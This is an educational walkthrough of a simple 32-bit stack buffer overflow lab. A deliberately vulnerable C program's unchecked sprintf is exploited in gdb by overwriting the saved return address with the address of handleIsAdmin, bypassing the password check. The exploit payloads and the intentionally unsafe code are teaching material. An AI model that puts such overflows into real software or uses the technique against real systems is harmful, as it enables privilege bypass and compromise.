# Simple Buffer overflow - redirect execution flow

## Intro

We will perform a simple buffer overflow on a binary. This overflow
will change the function flow, which enables us to gain "admin" privileges.

We do this by overwriting SIP with the address of `handleIsAdmin()` function.

## Goal

* Understand C arrays by misusing them
* Get comfortable with gdb
* Deeper understanding of the stack


## Vulnerable program

We have the following program:

challenge10.c:
```
#include <stdio.h>
#include <stdlib.h>
#include <crypt.h>
#include <string.h>

/* hash of: "ourteacheristehbest" */
const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";


int checkPassword(char *password) {
    char *hash;

    /* $6$ is SHA256 */
    hash = crypt(password, "$6$saaaaalty");

    if (strcmp(hash, adminHash) == 0) {
        return 1;
    } else {
        return 0;
    }
}


void handleIsAdmin(void) {
        printf("You are admin!\n");
}

void handleIsNotAdmin(void) {
        printf("You are not admin.\n");
}


int checkName(char *username) {
    char name[64]; // should be enough for all usernames

    // create according username
    sprintf(name, "%s-%s", "cmd", username);

    // atm we accept all usernames
    return 1;
}


void handleData(char *username, char *password) {
    if (! checkName(username)) {
        return;
    }

    // Check if user has admin privileges
    if(checkPassword(password)) {
        handleIsAdmin();
    } else {
        handleIsNotAdmin();
    }
}


int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Call: %s <name> <password>\n", argv[0]);
        exit(0);
    }

    handleData(argv[1], argv[2]);
}

```

The second argument of the program is copied into a stack buffer `name` of 64 byte size.


## Normal behaviour

Lets execute the program with normal length string, and with a wrong password:

```
root@hlUbuntu32:~/challenges/challenge10# ./challenge10 sheldon test
You are not admin.
```

The password "test" seems to be not correct, as the program tells us "You are not admin".


Lets execute it with the correct password `ourteacheristehbest`:
```
root@hlUbuntu32:~/challenges/challenge10# ./challenge10 sheldon ourteacheristehbest
You are admin!
```

With the correct password, a message will be printed indicating that the user "cmd-sheldon"
has admin privileges.

## Abnormal behaviour - overflow

What happens when you insert a string which is longer than 64 bytes? Lets try it.
We can use python to print 100 characters:

```
root@hlUbuntu32:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*100'` test
Segmentation fault (core dumped)
```

## Overflow analysis

Lets analyze the overflow a bit more. We start GDB with the target binary
as parameter. The binary will be loaded into GDB and be ready to run.
Then we will run it as above with the command `r`:

```
root@hlUbuntu32:~/challenges/challenge10# gdb ./challenge10

gdb-peda$ r `python -c 'print "A"*100'` test
Starting program: /root/challenges/challenge10/challenge10 `python -c 'print "A"*100'` test

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0x0
ECX: 0x7fffff97
EDX: 0x804880c --> 0x6c614300 ('')
ESI: 0xf7f99000 --> 0x1b1db0
EDI: 0xf7f99000 --> 0x1b1db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd600 ('A' <repeats 24 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd600 ('A' <repeats 24 times>)
0004| 0xffffd604 ('A' <repeats 20 times>)
0008| 0xffffd608 ('A' <repeats 16 times>)
0012| 0xffffd60c ('A' <repeats 12 times>)
0016| 0xffffd610 ("AAAAAAAA")
0020| 0xffffd614 ("AAAA")
0024| 0xffffd618 --> 0xffffd600 ('A' <repeats 24 times>)
0028| 0xffffd61c --> 0x80486d2 (<main+82>:      add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

As we can see, the value of `EIP` is `0x41414141`, or `AAAA` in ASCII.
It seems the CPU wants to continue the execution at an address which is based
on our input string (`AAAAAAAA....`)!

Maybe we can call the function `handleIsAdmin()`, which actually knowing
the password?

We would require the following things for this:
* The address of the function `handleIsAdmin()`
* The location in the input string which gets inserted into SIP/EIP (offset)

## Find out address of target function

We can easily find out the address of `handleIsAdmin()`:

```
gdb-peda$ print &handleIsAdmin
$1 = (<text variable, no debug info> *) 0x80485ed <handleIsAdmin>
```

It seems our target address is `0x80485ed`.

## Find out the offset

We will update or python-based argument generator by appending `BBBB` at the
`AAAA`'s:

```
root@hlUbuntu32:~/challenges/challenge10# python -c 'print "A"*100+"BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

And reduce the `100` until EIP is `0x42424242`, or `BBBB` in ASCII:

Trying with `75`:
```
gdb-peda$ r `python -c 'print "A"*75+"BBBB"'` test
Starting program: /root/challenges/challenge10/challenge10 `python -c 'print "A"*75+"BBBB"'` test
...
0x42414141 in ?? ()
```

Not quite! Lets try it with `72`

```
gdb-peda$ r `python -c 'print "A"*72+"BBBB"'` test
0x42424242 in ?? ()
```

Bingo! The 4-byte value `BBBB` is now completely stored in `EIP`! Therefore
the offset to SIP (the stored instruction pointer, which gets loaded into
  EIP when executing a `ret`) is 72 bytes.
This means we can redirect the execution flow of the target program to any
address we want. For example the address of `handleIsAdmin` from above.

## Write the exploit

Lets re-iterate what we know:
* The offset in the first input argument to SIP is exactly 72 bytes.
* The address of `handleIsAdmin` is `0x80485ed`

The next step is to replace the `BBBB` (the SIP) with the address of `handleIsAdmin`.
Note that because of the little-endianness, we have to convert the address:
* `0x080485ed` = `0xed 0x85 0x04 0x08`

Just read it from back to front, and fill to 4 bytes (4 times 1 byte, or
  4 times two-digit hex number).

Lets update our python argument line generator again. We can specify raw
bytes in hex by prepending them with `\x`. Or in other words, `\x41` = `A`.
```
root@hlUbuntu32:~/challenges/challenge10# python -c 'print "A"*72+"\xed\x85\x04\x08"' | hexdump -v -C
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  ed 85 04 08 0a           |AAAAAAAA.....|
0000004d
```

Not that the bytes in the address are not ASCII-printable, therefore we piped
the output into hexdump. You'll also see that `print` added a newline character
at the end, byte `0a`. This should not be a problem.

Lets put it together, in GDB:
```
gdb-peda$ r `python -c 'print "A"*72+"\xed\x85\x04\x08"'` test
Starting program: /root/challenges/challenge10/challenge10 ` python -c 'print "A"*72+"\xed\x85\x04\x08"'` test
You are admin!

Program received signal SIGILL, Illegal instruction.
 [----------------------------------registers-----------------------------------]
EAX: 0xf
EBX: 0x0
ECX: 0xffffffff
EDX: 0xf7f9a870 --> 0x0
ESI: 0xf7f99000 --> 0x1b1db0
EDI: 0xf7f99000 --> 0x1b1db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd614 --> 0xf7f99000 --> 0x1b1db0
EIP: 0xffffd800 --> 0xa6d3ca8d
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xffffd800:  (bad)
   0xffffd801:  retf   0xa6d3
   0xffffd804:  loope  0xffffd7e9
   0xffffd806:  jbe    0xffffd7a8
[------------------------------------stack-------------------------------------]
0000| 0xffffd614 --> 0xf7f99000 --> 0x1b1db0
0004| 0xffffd618 --> 0x0
0008| 0xffffd61c --> 0xf7dff32a (<init_cacheinfo+666>:  mov    DWORD PTR [esp+0xc],0x2)
0012| 0xffffd620 --> 0x3
0016| 0xffffd624 --> 0x0
0020| 0xffffd628 --> 0xffffd648 --> 0x0
0024| 0xffffd62c --> 0x80486d2 (<main+82>:      add    esp,0x10)
0028| 0xffffd630 --> 0xffffd841 ('A' <repeats 72 times>, "\355\205\004\b")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGILL
0xffffd800 in ?? ()
```

It seems that the program crashes. But WAIT! It printed `You are admin!` before
it crashed! Does that mean that the `handleIsAdmin` was executed? Lets double-check
by setting a breakpoint in `handleIsAdmin`:

```
gdb-peda$ b *handleIsAdmin
Breakpoint 1 at 0x80485ed
gdb-peda$ r ` python -c 'print "A"*72+"\xed\x85\x04\x08"'` test
Starting program: /root/challenges/challenge10/challenge10 ` python -c 'print "A"*72+"\xed\x85\x04\x08"'` test
 [----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0x0
ECX: 0x7fffffaf
EDX: 0x804880c --> 0x6c614300 ('')
ESI: 0xf7f99000 --> 0x1b1db0
EDI: 0xf7f99000 --> 0x1b1db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd610 --> 0xffffd800 --> 0x17abd7ed
EIP: 0x80485ed (<handleIsAdmin>:        push   ebp)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485e6 <checkPassword+59>:        mov    eax,0x0
   0x80485eb <checkPassword+64>:        leave
   0x80485ec <checkPassword+65>:        ret
=> 0x80485ed <handleIsAdmin>:   push   ebp
   0x80485ee <handleIsAdmin+1>: mov    ebp,esp
   0x80485f0 <handleIsAdmin+3>: sub    esp,0x8
   0x80485f3 <handleIsAdmin+6>: sub    esp,0xc
   0x80485f6 <handleIsAdmin+9>: push   0x80487e1
[------------------------------------stack-------------------------------------]
0000| 0xffffd610 --> 0xffffd800 --> 0x17abd7ed
0004| 0xffffd614 --> 0xf7f99000 --> 0x1b1db0
0008| 0xffffd618 --> 0x0
0012| 0xffffd61c --> 0xf7dff32a (<init_cacheinfo+666>:  mov    DWORD PTR [esp+0xc],0x2)
0016| 0xffffd620 --> 0x3
0020| 0xffffd624 --> 0x0
0024| 0xffffd628 --> 0xffffd648 --> 0x0
0028| 0xffffd62c --> 0x80486d2 (<main+82>:      add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080485ed in handleIsAdmin ()
gdb-peda$ where
#0  0x080485ed in handleIsAdmin ()
#1  0xffffd800 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```

Indeed, breakpoint 1 was hit, and we stopped execution in `handleIsAdmin`!

Lets check it a third time, this time without gdb:

```
root@hlUbuntu32:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*72+"\xed\x85\x04\x08"'` ourteacheristehbest
You are admin!
Segmentation fault (core dumped)
root@hlUbuntu32:~/challenges/challenge10#
```

Indeed, we are admin without the password!


# Questions

1) Why is the trailing newline character `0x0a` not a problem? Doesnt it corrupt the memory?

2) Why does it crash at the end?

3) Why is `You are not admin.` NOT printed? Where exactly in the code did we redirect the execution flow?

# Answers

1) We already completely corrupted the stack. The `0x0a` is on higher memory addresses, and does not do more damage than we already did

2) It tries to ret()

3) It crashes upon returning from `checkName()`, therefore on line 40. Or, equivalently, on line 45. The statements on line  51 and 53 are never executed.

# Follow-up

We performed the exploit mostly blind. Can we also perform this a bit more scientifically?

As we know via source code analysis that the buffer overflow is happening in the
function `checkName()` at the instruction `sprintf()`, lets set some breakpoints
before and after. We'll examine the state of the stack on each breakpoint:

```
root@hlUbuntu32:~/challenges/challenge10# gdb -q challenge10
Reading symbols from challenge10...(no debugging symbols found)...done.
gdb-peda$ disas checkName
Dump of assembler code for function checkName:
   0x0804861f <+0>:     push   ebp
   0x08048620 <+1>:     mov    ebp,esp
   0x08048622 <+3>:     sub    esp,0x48
   0x08048625 <+6>:     push   DWORD PTR [ebp+0x8]
   0x08048628 <+9>:     push   0x8048803
   0x0804862d <+14>:    push   0x8048807
   0x08048632 <+19>:    lea    eax,[ebp-0x48]
   0x08048635 <+22>:    push   eax
   0x08048636 <+23>:    call   0x8048490 <sprintf@plt>
   0x0804863b <+28>:    add    esp,0x10
   0x0804863e <+31>:    mov    eax,0x1
   0x08048643 <+36>:    leave
   0x08048644 <+37>:    ret
End of assembler dump.
gdb-peda$ b *checkName+22
Breakpoint 1 at 0x8048635
gdb-peda$ b *checkName+28
Breakpoint 2 at 0x804863b
gdb-peda$ r `python -c 'print "A"*100'` test
Starting program: /root/challenges/challenge10/challenge10 `python -c 'print "A"*100'` test

 [----------------------------------registers-----------------------------------]
EAX: 0xffffd5b0 --> 0xffffd5ee --> 0xffff0000 --> 0x0
EBX: 0x0
ECX: 0xffffd650 --> 0x3
EDX: 0xffffd88e ("test")
ESI: 0xf7f99000 --> 0x1b1db0
EDI: 0xf7f99000 --> 0x1b1db0
EBP: 0xffffd5f8 --> 0xffffd618 --> 0xffffd638 --> 0x0
ESP: 0xffffd5a4 --> 0x8048807 ("%s-%s")
EIP: 0x8048635 (<checkName+22>: push   eax)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048628 <checkName+9>:     push   0x8048803
   0x804862d <checkName+14>:    push   0x8048807
   0x8048632 <checkName+19>:    lea    eax,[ebp-0x48]
=> 0x8048635 <checkName+22>:    push   eax
   0x8048636 <checkName+23>:    call   0x8048490 <sprintf@plt>
   0x804863b <checkName+28>:    add    esp,0x10
   0x804863e <checkName+31>:    mov    eax,0x1
   0x8048643 <checkName+36>:    leave
[------------------------------------stack-------------------------------------]
0000| 0xffffd5a4 --> 0x8048807 ("%s-%s")
0004| 0xffffd5a8 --> 0x8048803 --> 0x646d63 ('cmd')
0008| 0xffffd5ac --> 0xffffd829 ('A' <repeats 100 times>)
0012| 0xffffd5b0 --> 0xffffd5ee --> 0xffff0000 --> 0x0
0016| 0xffffd5b4 --> 0x1
0020| 0xffffd5b8 --> 0xbf
0024| 0xffffd5bc --> 0xf7e77663 (<handle_intel+163>:    add    esp,0x10)
0028| 0xffffd5c0 --> 0xffffd5ee --> 0xffff0000 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048635 in checkName ()
gdb-peda$ x/32x $esp
0xffffd5a4:     0x08048807      0x08048803      0xffffd829      0xffffd5ee
0xffffd5b4:     0x00000001      0x000000bf      0xf7e77663      0xffffd5ee
0xffffd5c4:     0xffffd6f4      0x000000e0      0x00000000      0xf7ffd000
0xffffd5d4:     0xf7ffd918      0xffffd5f0      0x0804833c      0x00000000
0xffffd5e4:     0xffffd684      0xf7f99000      0x0000dfd7      0xffffffff
0xffffd5f4:     0x0000002f      0xffffd618      0x08048656      0xffffd829
0xffffd604:     0xf7f99000      0x00000000      0xf7dff32a      0x00000003
0xffffd614:     0x00000000      0xffffd638      0x080486d2      0xffffd829

gdb-peda$ x/1x $ebp+4
0xffffd5fc:     0x08048656
```

Is this really the return address? lets check:
```
gdb-peda$ disas 0x08048656
Dump of assembler code for function handleData:
   0x08048645 <+0>:     push   ebp
   0x08048646 <+1>:     mov    ebp,esp
   0x08048648 <+3>:     sub    esp,0x8
   0x0804864b <+6>:     sub    esp,0xc
   0x0804864e <+9>:     push   DWORD PTR [ebp+0x8]
   0x08048651 <+12>:    call   0x804861f <checkName>
   0x08048656 <+17>:    add    esp,0x10
...
```

Indeed it is, it is the address of the instruction following the call
to `checkName()`. `call` will automatically push that address on the stack

Lets check the state of the stack after the next breakpoint (after sprintf()):

```
gdb-peda$ c
Continuing.
 [----------------------------------registers-----------------------------------]
EAX: 0x68 ('h')
EBX: 0x0
ECX: 0x7fffff97
EDX: 0x804880c --> 0x6c614300 ('')
ESI: 0xf7f99000 --> 0x1b1db0
EDI: 0xf7f99000 --> 0x1b1db0
EBP: 0xffffd5f8 ('A' <repeats 32 times>)
ESP: 0xffffd5a0 --> 0xffffd5b0 ("cmd-", 'A' <repeats 100 times>)
EIP: 0x804863b (<checkName+28>: add    esp,0x10)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048632 <checkName+19>:    lea    eax,[ebp-0x48]
   0x8048635 <checkName+22>:    push   eax
   0x8048636 <checkName+23>:    call   0x8048490 <sprintf@plt>
=> 0x804863b <checkName+28>:    add    esp,0x10
   0x804863e <checkName+31>:    mov    eax,0x1
   0x8048643 <checkName+36>:    leave
   0x8048644 <checkName+37>:    ret
   0x8048645 <handleData>:      push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xffffd5a0 --> 0xffffd5b0 ("cmd-", 'A' <repeats 100 times>)
0004| 0xffffd5a4 --> 0x8048807 ("%s-%s")
0008| 0xffffd5a8 --> 0x8048803 --> 0x646d63 ('cmd')
0012| 0xffffd5ac --> 0xffffd829 ('A' <repeats 100 times>)
0016| 0xffffd5b0 ("cmd-", 'A' <repeats 100 times>)
0020| 0xffffd5b4 ('A' <repeats 100 times>)
0024| 0xffffd5b8 ('A' <repeats 96 times>)
0028| 0xffffd5bc ('A' <repeats 92 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0804863b in checkName ()
gdb-peda$ x/1xw $ebp+4
0xffffd5fc:     0x41414141
gdb-peda$ x/32xw $esp
0xffffd5a0:     0xffffd5b0      0x08048807      0x08048803      0xffffd829
0xffffd5b0:     0x2d646d63      0x41414141      0x41414141      0x41414141
0xffffd5c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd610:     0x41414141      0x41414141      0xffffd600      0x080486d2
```

Indeed, `$ebp+4` is `0x41414141` and located at address `0xffffd5fc`,
whereas before it was the address
where the instruction flow continues after the function `checkName()` is finished.

Just by looking at this output, are you able to calculate the offset of 72 bytes?

If you have troubles, check the following diagram:
```
0xffffd5a0:     0xffffd5b0      0x08048807      0x08048803      0xffffd829
0xffffd5b0:     0x2d646d63    ->0x41414141      0x41414141      0x41414141  3*4=12
0xffffd5c0:     0x41414141      0x41414141      0x41414141      0x41414141  4*4=16
0xffffd5d0:     0x41414141      0x41414141      0x41414141      0x41414141  4*4=16
0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141  4*4=16
0xffffd5f0:     0x41414141      0x41414141      0x41414141<-    SIPSIPSIP   3*4=12
0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd610:     0x41414141      0x41414141      0xffffd600      0x080486d2
```
12+16+16+16+12 = 72. QED.
